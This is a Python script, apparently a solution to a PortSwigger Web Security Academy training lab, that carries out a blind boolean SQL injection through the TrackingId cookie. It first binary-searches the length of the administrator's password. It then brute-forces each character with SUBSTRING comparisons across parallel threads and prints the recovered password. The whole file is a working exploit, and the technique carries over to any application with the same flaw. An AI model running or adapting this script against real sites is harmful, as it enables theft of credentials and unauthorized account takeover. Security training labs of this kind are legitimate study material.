import string
import urllib.request
from concurrent.futures import ThreadPoolExecutor, as_completed
from http.cookiejar import CookieJar

LAB_URL = 'https://0a6f006b04fde43f827c476a009000ba.web-security-academy.net/'
TRACK_ID = 'nOknhc0E2ez12LTE'
FILTERS = 'filter?category=Accessories'
ALPHABET = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)


def create_session():
    """Create a session with cookie jar"""
    cookie_jar = CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cookie_jar))
    urllib.request.install_opener(opener)
    return opener


def make_request(opener, url, cookies):
    req = urllib.request.Request(url)
    
    # Add cookies to request
    cookie_header = '; '.join([f"{k}={v}" for k, v in cookies.items()])
    req.add_header('Cookie', cookie_header)
    
    try:
        response = opener.open(req, timeout=15)
        return response.read().decode('utf-8')
    except Exception as e:
        print(f"Error: {e}")
        return ""


def ping(opener) -> bool:
    SQL_CONDITION = "1=1"
    
    url = LAB_URL + FILTERS
    cookies = {
        'TrackingId': f"{TRACK_ID}' and {SQL_CONDITION} --"
    }
    
    text = make_request(opener, url, cookies)
    
    if text.count('Welcome back!') > 0:
        print("Tracking ID Recognized!\n")
        return True
        
    return False


def determine_length(opener):
    start = 1
    end = 50
    length = None
    
    while start <= end:
        mid = (start + end) // 2
        SQL_CONDITION = f"(SELECT length(password) FROM users WHERE username = 'administrator') > {mid}"
        
        url = LAB_URL + FILTERS
        cookies = {
            'TrackingId': f"{TRACK_ID}' and {SQL_CONDITION} --"
        }
        
        text = make_request(opener, url, cookies)
        
        if text.count('Welcome back!') > 0:
            print(f"Password length > {mid}")
            start = mid + 1
        else:
            print(f"Password length <= {mid}")
            length = mid
            end = mid - 1
    
    print(f"Password length: {length}")
    return length
            
def check_letter_for_position(opener, cur, letter):
    url = LAB_URL + FILTERS
    cookies = {
        'TrackingId': f"{TRACK_ID}' and SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {cur}, 1) = '{letter}' --"
    }
    
    text = make_request(opener, url, cookies)
    
    if text.count('Welcome back!') > 0:
        return letter, True
    return letter, False

def crack_text_pwd(opener, length: int):
    result: list[str] = []
    
    while len(result) < length:
        cur = len(result) + 1
        print(f"\nSearching position {cur}...")
        
        found_letter = None
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = {
                executor.submit(check_letter_for_position, opener, cur, letter): letter 
                for letter in ALPHABET
            }
            
            for future in as_completed(futures):
                letter, is_match = future.result()
                
                if is_match:
                    print(f"✓ {letter}", end=" ", flush=True)
                    found_letter = letter
                    [f.cancel() for f in futures]
                    break
                
                print(f"✗ {letter}", end=" ", flush=True)
        
        if found_letter:
            print(f"\n✓ Found: {found_letter} at position {cur}")
            result.append(found_letter)
            continue
        
        print(f"\n✗ Warning: No letter found for position {cur}")
        break
    
    print(f"\n\nPassword: {''.join(result)}")
    return ''.join(result)
            
if __name__ == '__main__':
    opener = create_session()
    
    if not ping(opener):
        print("Invalid Tracking ID, please refresh before attempting: ")
        exit()
        
    length = determine_length(opener)
    crack_text_pwd(opener, length)
    